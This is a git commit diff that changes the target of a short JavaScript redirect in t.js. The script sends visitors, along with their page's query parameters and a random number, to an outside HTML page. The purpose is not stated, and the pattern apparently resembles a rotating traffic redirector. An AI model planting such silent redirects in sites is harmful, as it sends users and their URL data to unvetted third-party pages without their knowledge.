1cd29064f52e784301bbafa9b5c4a451ef988ee5
reyalpilareyalpila <167016503+reyalpilareyalpila@users.noreply.github.com>
2024-08-16 13:33:58 +0800

    Update t.js

--- t.js
+++ t.js
@@ -1,4 +1,4 @@
-var urll="https://dxxapp.daliyu.cc/ckldapp/up/20240815/09033767601df9.html"
+var urll="https://cdn.51youhui.com/upload/20240816/1824318469993537538.html"
 var params = new URLSearchParams(location.href.split('?')[1]);
   var sjs = Math.floor(Math.random() * (9999 - 1000 + 1)) + 1000;
   window.location.replace(urll + "?" + sjs + "?" + params);
